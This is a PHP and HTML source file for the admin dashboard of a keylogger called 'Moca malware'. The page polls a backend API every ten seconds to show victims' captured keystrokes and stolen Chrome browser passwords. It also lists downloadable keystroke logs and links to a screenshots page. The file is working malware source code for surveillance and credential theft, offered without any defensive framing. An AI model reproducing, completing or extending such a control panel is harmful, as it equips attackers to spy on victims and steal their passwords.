<!DOCTYPE html>
<?php
    require_once('model/keystrokes.php');
?>
<html>
    <head>
        <title>Moca malware - Keylogger</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <!-- Compiled and minified CSS -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/css/materialize.min.css">
        <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
        <!-- Compiled and minified JavaScript -->
        <!-- Compiled and minified JavaScript -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.97.7/js/materialize.min.js"></script>
    </head>
    
    <style>
        .title {
            font-weight: bold;
        }
    </style>
    <script>
        function auto_load(){
            $.ajax({
              url: "api.php?get=keystrokes",
              cache: false,
              success: function(data){
                 $("#keystrokes").html(data.replace(/(\{{.*?\}})/g, ''));
              } 
            });
            
            $.ajax({
              url: "api.php?get=password",
              cache: false,
              success: function(data){
                 $("#password").html(data);
              } 
            });
        }
        
        $(document).ready(function(){
            auto_load(); //Call auto_load() function when DOM is Ready
            Materialize.toast('For more details open the txt log', 4000);
       });
       
       setInterval(auto_load,10000);
    </script>
    <body>
        <?php
            if(!defined('__ROOT__'))
                define ('__ROOT__', $_SERVER['DOCUMENT_ROOT']);

            define ('__LOGS_FOLDER__', __ROOT__ . '/moca/data/logs');
            $availableLogs = scandir(__LOGS_FOLDER__, 1);
        ?>
        <nav class="navbar-fixed">
            <div class="nav-wrapper" style="padding: 0px 15px">
              <a href="#"  class="brand-logo">Moca | Admin</a>
              <ul id="nav-mobile" class="right hide-on-med-and-down">
                <li><a href="index.php">Home</a></li>
                <li><a href="keylogger.php">Keylogger</a></li>
                <li><a href="screenshots.php">Screenshot</a></li>
              </ul>
            </div>
        </nav>
        <br><br>
        <div class="container">
            <div class="col s6">
                <div class="card horizontal">
                  <div class="card-image">
                    <img src="images/side_pic.jpg">
                  </div>
                  
                  <div class="card-stacked">
                    <div class="card-content">
                        <h4 class="header">Available logs</h4>
                        <ul class="collection" style="border: none">
                            <?php 
                               foreach(array_slice($availableLogs, 0, -2) as $log)
                               {
                                    echo "<li class='collection-item'>";
                                    echo "<span><a href='data\\logs\\$log'>$log</a></span>";
                                    echo "</li>";
                               }
                            ?>
                        </ul>
                    </div>
                  </div>
                </div>
                
                <br><br>
                
                <ul class="collapsible" data-collapsible="accordion">
                    <li>
                        <div class="collapsible-header"><i class="material-icons">library_books</i>Current Log</div>
                        <div class="collapsible-body">
                        <div class="title"><?php echo date('d/m/y'); ?></div>
                            <div style="word-wrap: break-word; padding: 15px;" id="keystrokes"></div>
                        </div>
                    </li>
                    
                    <li>
                        <div class="collapsible-header"><i class="material-icons">https</i>Browser Passwords</div>
                        <div class="collapsible-body">
                            <div class="title">Chrome passwords</div>
                              <div style="word-wrap: break-word; padding: 15px;" id="password"></div>
                            </div>
                    </li>
                </ul>
            </div>
            
            <br><br>
        </div>
    </body>
</html>